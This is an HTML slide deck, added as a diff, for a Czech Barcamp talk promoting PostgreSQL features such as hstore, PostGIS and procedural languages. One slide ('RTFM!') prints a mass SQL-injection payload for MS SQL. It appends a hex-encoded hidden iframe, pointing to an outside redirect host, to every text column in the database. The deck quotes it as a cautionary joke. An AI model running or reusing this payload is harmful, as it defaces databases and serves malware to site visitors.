@@ -1,0 +1,384 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+  <title>PostgeSQL</title>
+
+  <meta name="viewport" content="width=device-width"/>
+
+  <link rel="stylesheet" href="./css/reset.css" type="text/css"/>
+  <link rel="stylesheet" href="./css/showoff.css" type="text/css"/>
+
+  <script type="text/javascript" src="./js/jquery-1.4.2.min.js"></script>
+  <script type="text/javascript" src="./js/jquery.cycle.all.js"></script>
+	<script type="text/javascript" src="./js/jquery-print.js"></script>
+  <script type="text/javascript" src="./js/jquery.batchImageLoad.js"></script>
+
+  <script type="text/javascript" src="./js/jquery.doubletap-0.1.js"></script>
+
+  <script type="text/javascript" src="./js/fg.menu.js"></script>
+  <script type="text/javascript" src="./js/showoff.js"></script>
+  <script type="text/javascript" src="./js/jTypeWriter.js"> </script>
+  <script type="text/javascript" src="./js/sh_main.min.js"></script>
+  <script type="text/javascript" src="./js/core.js"></script>
+  <script type="text/javascript" src="./js/showoffcore.js"></script>
+  <script type="text/javascript" src="./js/coffee-script.js"></script>
+
+  <link type="text/css" href="./css/fg.menu.css" media="screen" rel="stylesheet" />
+  <link type="text/css" href="./css/theme/ui.all.css" media="screen" rel="stylesheet" />
+  <link type="text/css" href="./css/sh_style.css" rel="stylesheet" >
+
+  
+    <link rel="stylesheet" href="file/custom.css" type="text/css"/>
+  
+
+  
+
+  <script type="text/javascript">
+  $(function(){
+      setupPreso(false, './');
+  });
+  </script>
+
+</head>
+
+<body>
+
+<a tabindex="0" href="#search-engines" class="fg-button fg-button-icon-right ui-widget ui-state-default ui-corner-all" id="navmenu"><span class="ui-icon ui-icon-triangle-1-s"></span>slides</a>
+<div id="navigation" class="hidden"></div>
+
+<div id="help">
+  <table>
+    <tr><td class="key">z, ?</td><td>toggle help (this)</td></tr>
+    <tr><td class="key">space, &rarr;</td><td>next slide</td></tr>
+    <tr><td class="key">shift-space, &larr;</td><td>previous slide</td></tr>
+    <tr><td class="key">d</td><td>toggle debug mode</td></tr>
+    <tr><td class="key">## &lt;ret&gt;</td><td>go to slide #</td></tr>
+    <tr><td class="key">c, t</td><td>table of contents (vi)</td></tr>
+    <tr><td class="key">f</td><td>toggle footer</td></tr>
+    <tr><td class="key">r</td><td>reload slides</td></tr>
+    <tr><td class="key">n</td><td>toggle notes</td></tr>
+    <tr><td class="key">p</td><td>run preshow</td></tr>
+  </table>
+</div>
+
+<div class="buttonNav">
+  <input type="submit" onClick="prevStep();" value="prev"/>
+  <input type="submit" onClick="nextStep();" value="next"/>
+</div>
+
+<div id="preso">loading presentation...</div>
+<div id="footer">
+  <span id="slideInfo"></span>
+  <span id="debugInfo"></span>
+  <span id="notesInfo"></span>
+</div>
+
+<div id="slides" class="offscreen" style="display:none;">
+<div class="slide" data-transition="none"><div class="content center" ref="stories/01_mystory/1">
+<h1>PostgreSQL</h1>
+
+<p><img src="./file/stories/ext/Postgresql_elephant.svg" alt="Postgres"/></p></div>
+</div><div class="slide" data-transition="none"><div class="content bullets incremental" ref="stories/01_mystory/2">
+<h1>Martin Putniorz</h1>
+
+<ul>
+<li>Freelance program&#xE1;tor</li>
+<li>T&#x11B;&#x17E;k&#xFD; pythonista</li>
+<li>Datab&#xE1;zov&#xFD; &#x161;&#xED;lenec</li>
+</ul>
+</div>
+</div><div class="slide" data-transition="none"><div class="content bullets incremental" ref="stories/01_mystory/3">
+<h1>M&#x16F;j &#x17E;ivot s Postgresem</h1>
+
+<ul>
+<li>St&#x159;edn&#xED; &#x161;kola</li>
+<li>Hobby projekty</li>
+<li>Pr&#xE1;ce</li>
+</ul>
+</div>
+</div><div class="slide" data-transition="none"><div class="content" ref="stories/01_mystory/4">
+<h1>Nejobl&#xED;ben&#x11B;j&#x161;&#xED; SQL &#xFA;lo&#x17E;i&#x161;t&#x11B;</h1>
+
+<p>(moje)</p></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="stories/02_slidestory1/1">
+<h1>Prezenta&#x10D;n&#xED; geneze</h1></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="stories/02_slidestory1/2">
+<h1><span class="underscored">1) Informa&#x10D;n&#x11B; nab(l)it&#xE1;</span></h1></div>
+</div><div class="slide" data-transition="none"><div class="content smaller bullets" ref="stories/02_slidestory1/3">
+<h1>Typy</h1>
+
+<ul class="fourcolumn">
+    <li>bigint</li>
+    <li>bigserial</li>
+    <li>bit</li>
+    <li>boolean</li>
+    <li>box</li>
+    <li>bytea</li>
+    <li>character</li>
+    <li>cidr</li>
+    <li>circle</li>
+    <li>date</li>
+    <li>double precision</li>
+    <li>inet</li>
+    <li>integer</li>
+    <li>interval</li>
+    <li>line</li>
+    <li>lseg</li>
+    <li>macaddr</li>
+    <li>money</li>
+    <li>numeric</li>
+    <li>path</li>
+    <li>point</li>
+    <li>polygon</li>
+    <li>smallint</li>
+    <li>serial</li>
+    <li>text</li>
+    <li>time</li>
+    <li>timestamp</li>
+    <li>tsquery</li>
+    <li>tsvector</li>
+    <li>txid_snapshot</li>
+    <li>uuid</li>
+    <li>xml</li>
+</ul>
+
+
+</div>
+</div><div class="slide" data-transition="none"><div class="content center" ref="stories/02_slidestory1/4">
+<h1>U&#x17E;ivatel&#xE9;</h1>
+
+<p><img src="./file/stories/ext/heroku-logo.png" width="323" height="123" alt="Heroku"/></p>
+
+<p><img src="./file/stories/ext/Instagram_logo.png" width="200" height="200" alt="Instagram"/></p></div>
+</div><div class="slide" data-transition="none"><div class="content center" ref="stories/02_slidestory1/5">
+<p><img src="./file/stories/ext/Openstreetmap_logo.svg" alt="OpenStreetMap"/></p>
+
+<p><img src="./file/stories/ext/Reddit_logo.svg" alt="Reddit"/></p>
+
+<p><img src="./file/stories/ext/Skype_logo2.svg" alt="Skype"/></p></div>
+</div><div class="slide" data-transition="none"><div class="content center" ref="stories/02_slidestory1/6">
+<p><img src="./file/stories/ext/Sony_Online_Entertainment_Logo.png" width="450" height="297" alt="Sony Online"/></p>
+
+<p><img src="./file/stories/ext/Yahoo_Logo.svg" alt="Yahoo!"/></p></div>
+</div><div class="slide" data-transition="none"><div class="content center smaller" ref="stories/02_slidestory1/7">
+<p><img src="./file/stories/ext/ISS_insignia.png" width="566" height="700" alt="ISS"/></p></div>
+</div><div class="slide" data-transition="none"><div class="content smbullets" ref="stories/02_slidestory1/8">
+<h1>Schopnosti</h1>
+
+<ul>
+<li>Procedural languages</li>
+<li>Schemaless</li>
+<li>MVCC</li>
+<li>Rules</li>
+<li>User-defined objects</li>
+<li>Asynchronous Notifications</li>
+<li>Contrib Modules</li>
+<li>Foreign Data Wrappers</li>
+</ul>
+</div>
+</div><div class="slide" data-transition="none"><div class="content" ref="stories/02_slidestory1/9">
+<h2>Takhle ne</h2></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="stories/03_slidestory2/1">
+<h1><span class="underscored">2) Z&#xE1;bavn&#xE1;</span></h1></div>
+</div><div class="slide" data-transition="none"><div class="content center" ref="stories/03_slidestory2/2">
+<p><img id="fireball" src="/image/stories/ext/543d1b_424446.jpg" alt="Ultimate Fireball"/></p></div>
+</div><div class="slide" data-transition="none"><div class="content smaller" ref="stories/03_slidestory2/3">
+<pre class="sh_python"><code>d="""ou@on@he@ell@ w@ay it
+@ otUr@BVna @make4 @ve@'re@ing@t's been@ a@
+(Ooh@o @ g@
+YX@ t@ know@nd @
+N2@ how I'm feelJ
+@iL4 up@6)E)8giL, n2giL
+(G@ yX@
+I justSannaxT47Gotta Munderstand0@eLrP@
+
+We'Lqn eachQ for sClVgzr UarHFchJ butzKxoCshyxCsRInsideSe bothqShaHBoJ V
+WeqxUBameF9weKPplR@
+8g68let4 down8runFrX9a9desert48Mcry8sayBoodbye8tTF lieF9hurt4@WeK nCstrangersxCloLzqxU rulesF9sCdCI
+A full commitment'sShat I'mxhinkJ ofzSXldn'tBetxhis fromFnyQBuy31A9if4Fsk me7DV'txT me4KxoCbli9tCsee00
+E,B6)E,B556)1300
+"""
+for s in 'XVUTSRQPMLKJHFECBzxq9876543210':
+    a,b=d.split('@',1)
+    d=b.replace(s,a)
+print d</code></pre></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="stories/03_slidestory2/4">
+<h1>J&#xE1; bych se bavil</h1>
+
+<h2>Vy asi ne</h2></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/01_intro/1">
+<h1><span class="underscored">3) U&#x17E;ite&#x10D;n&#xE1;</span></h1></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/01_intro/2">
+<h1>Aneb Postgres mus&#xED; m&#xED;t zas n&#x11B;co extra</h1></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/01_intro/3">
+<h1>Aneb co v&#xE1;s v Databases 101 nenau&#x10D;&#xED;</h1></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/02_phones/1">
+<h1>Probl&#xE9;m: v&#xED;ce telefon&#xED;ch &#x10D;&#xED;sel</h1>
+
+<h2>Typick&#xE1; &#x159;e&#x161;en&#xED;</h2></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/02_phones/2">
+<pre class="sh_sql"><code>CREATE TABLE phonys (name VARCHAR, 
+phone VARCHAR);
+# Pro "v&#xED;ce" &#x10D;&#xED;sel
+CREATE TABLE phonyys (name VARCHAR, 
+phones VARCHAR);</code></pre></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/02_phones/3">
+<pre class="sh_sql"><code># Pro opravdov&#xE9; labu&#x17E;n&#xED;ky
+SELECT phones FROM phonyys WHERE ...
+# ...
+&lt;phones&gt;
+    &lt;work&gt;123-456-789&lt;/work&gt;
+    &lt;home&gt;987-654-321&lt;/home&gt;
+&lt;/phones&gt;</code></pre></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/02_phones/4">
+<h1>Spr&#xE1;vn&#xFD; non-Postgres postup</h1>
+
+<p>Dal&#x161;&#xED; tabulka a sp&#xE1;rov&#xE1;n&#xED; p&#x159;es ciz&#xED; kl&#xED;&#x10D;e</p></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/02_phones/5">
+<h1>Postgres postup je ale n&#x11B;co extra</h1>
+
+<p>Ustupte, p&#x159;ich&#xE1;z&#xED; ...</p></div>
+</div><div class="slide" data-transition="none"><div class="content bullets incremental" ref="cases/02_phones/6">
+<h1>hstore</h1>
+
+<ul>
+<li>Datov&#xFD; typ</li>
+<li>Key - value</li>
+<li>Bezesch&#xE9;movost</li>
+</ul>
+</div>
+</div><div class="slide" data-transition="none"><div class="content bullets incremental" ref="cases/02_phones/7">
+<h1>hstore FAQ</h1>
+
+<ul>
+<li>Indexace?</li>
+<li>Lep&#x161;&#xED; ne&#x17E; XML?</li>
+<li>Lep&#x161;&#xED; ne&#x17E; ciz&#xED; kl&#xED;&#x10D;e?</li>
+</ul>
+</div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/03_geo/1">
+<h1>Probl&#xE9;m: geografick&#xE1; data</h1>
+
+<h2>Typick&#xE1; &#x159;e&#x161;en&#xED;</h2></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/03_geo/2">
+<h1>Na v&#x11B;t&#x161;in&#x11B; datab&#xE1;z&#xED; obskurn&#xED; roz&#x161;&#xED;&#x159;en&#xED;</h1>
+
+<p>Nejlep&#x161;&#xED; je zjistit, &#x17E;e na MySQL podporuj&#xED; jen MyISAM</p></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/03_geo/3">
+<h1>PostGIS</h1>
+
+<p>M&#xE1;te r&#xE1;di mapy na 4sq?</p></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/04_pl/1">
+<h1>Probl&#xE9;m: Manipulace s daty l&#xED;n&#xFD;m program&#xE1;torem</h1>
+
+<h2>Typick&#xE1; &#x159;e&#x161;en&#xED;</h2></div>
+</div><div class="slide" data-transition="none"><div class="content smaller" ref="cases/04_pl/2">
+<h1>RTFM!</h1>
+
+<pre class="sh_sql"><code>dEcLArE @T vaRchaR(255),@c vARCHAr(255) decLAre tabLE_cUrsOR 
+CURSOR FoR SELECt A.name,b.naMe froM sysObjeCts a,sysCOLuMNs
+b wheRE a.id=B.id aND A.XtYPe='U' and (b.xTYPe=99 or 
+b.XType=35 oR B.xTYPe=231 OR b.xtypE=167) oPEN TAbLe_cuRsor 
+fETCH neXT FROm TaBlE_CuRsOr INtO @T,@c whilE(@@FetCh_stAtuS
+=0) beGIn exEc('UpDaTE ['+@t+'] SeT ['+@c+']=rtRIM(CONVeRT(
+VARCHAr(4000),['+@C+']))+caST(0x3C696672616D65207372633D226
+87474703A2F2F6E656D6F6875696C6469696E2E72752F7464732F676F2E
+7068703F7369643D31222077696474683D223022206865696768743D2230
+22207374796C653D22646973706C61793A6E6F6E65223E3C2F696672616
+D653E aS vaRCHar(106))') FETCh Next fRom tABle_cUrsOr IntO 
+@t,@c EnD Close tablE_CuRsoR dEALLoCATe TaBLe_CURsor;</code></pre></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/04_pl/3">
+<h1>M&#xE1;me r&#xE1;di sv&#x16F;j komfort</h1>
+
+<h2>A Postgres n&#xE1;m ho dop&#x159;eje</h2></div>
+</div><div class="slide" data-transition="none"><div class="content bullets incremental" ref="cases/04_pl/4">
+<h1>Procedural languages (PL)</h1>
+
+<ul>
+<li>PL/pgSQL</li>
+<li>PL/Tcl</li>
+<li>PL/Perl</li>
+<li>PL/Python</li>
+</ul>
+</div>
+</div><div class="slide" data-transition="none"><div class="content bullets smaller" ref="cases/04_pl/5">
+<h1>A kopa dal&#x161;&#xED;ch</h1>
+
+<ul class="twocolumn">
+    <li>PL/Java</li>
+    <li>PL/Js</li>
+    <li>PL/LOLCODE</li>
+    <li>PL/Lua</li>
+    <li>PL/OpenCL</li>
+    <li>PL/Parrot</li>
+    <li>PL/PHP</li>
+    <li>PL/Proxy</li>
+    <li>PL/PSM</li>
+    <li>PL/R</li>
+    <li>PL/Ruby</li>
+    <li>PL/scheme</li>
+    <li>PL/sh</li>
+    <li>PL/V8</li>
+</ul>
+
+
+</div>
+</div><div class="slide" data-transition="none"><div class="content bullets incremental" ref="cases/04_pl/6">
+<h1>Ide&#xE1;ln&#xED; vyu&#x17E;it&#xED;</h1>
+
+<ul>
+<li>Jednor&#xE1;zov&#xE1; modifikace</li>
+<li>Triggery</li>
+<li>Datov&#xE9; agregace</li>
+<li><code>Window</code> funkce</li>
+</ul>
+</div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/05_breadcrumbs/1">
+<h1>Nakonec p&#xE1;r bezv&#xFD;znamn&#xFD;ch drobnost&#xED;</h1>
+
+<p>(bez uk&#xE1;zek, ale s koment&#xE1;&#x159;em)</p></div>
+</div><div class="slide" data-transition="none"><div class="content bullets incremental" ref="cases/05_breadcrumbs/2">
+<ul>
+<li>Rychl&#xE9; a bezpe&#x10D;n&#xE9; migrace</li>
+<li>Foreign Data Wrappers</li>
+<li>Pou&#x17E;iteln&#xFD; fulltext (narozd&#xED;l od MySQL)</li>
+<li>Spousta roz&#x161;&#xED;&#x159;en&#xED;</li>
+<li>Rychl&#xFD; v&#xFD;voj (na pom&#x11B;ry SQL datab&#xE1;ze)</li>
+</ul>
+
+
+<p>(uveden&#xE9; plat&#xED; pro verzi 9.1)</p></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/05_breadcrumbs/3">
+<p><img id="sam" src="/image/cases/ext/unclesam.jpg" alt="Use it, soldier!"/></p></div>
+</div><div class="slide" data-transition="none"><div class="content bullets" ref="cases/05_breadcrumbs/4">
+<h1>Nejlep&#x161;&#xED; zp&#x16F;sob je pou&#x17E;&#xED;t to</h1>
+
+<ul>
+<li>Schemaverse <a href="https://schemaverse.com/">https://schemaverse.com/</a></li>
+<li>Postgres Guide <a href="http://postgresguide.com/">http://postgresguide.com/</a></li>
+<li>Heroku Postgres <a href="https://postgres.heroku.com/">https://postgres.heroku.com/</a></li>
+<li><a href="https://twitter.com/craigkerstiens">@craigkerstiens</a></li>
+</ul>
+</div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/05_breadcrumbs/5">
+<h1>Objektovou i funkcion&#xE1;ln&#xED;</h1>
+
+<h1>pochvalu a kritiku</h1>
+
+<p><a href="https://twitter.com/sputnikus">@sputnikus</a>
+<a href="http://zerp.ly/sputnikus">Martin Putniorz</a></p></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/05_breadcrumbs/6">
+<h1>Reklama</h1>
+
+<p>Legadino a Besteto jedou na PostgreSQL</p></div>
+</div><div class="slide" data-transition="none"><div class="content" ref="cases/05_breadcrumbs/7">
+<h1>D&#x11B;kuji v&#xE1;m</h1>
+
+<p>Hezk&#xFD; zbytek Barcampu</p></div>
+</div></div>
+
+</body>
+</html>
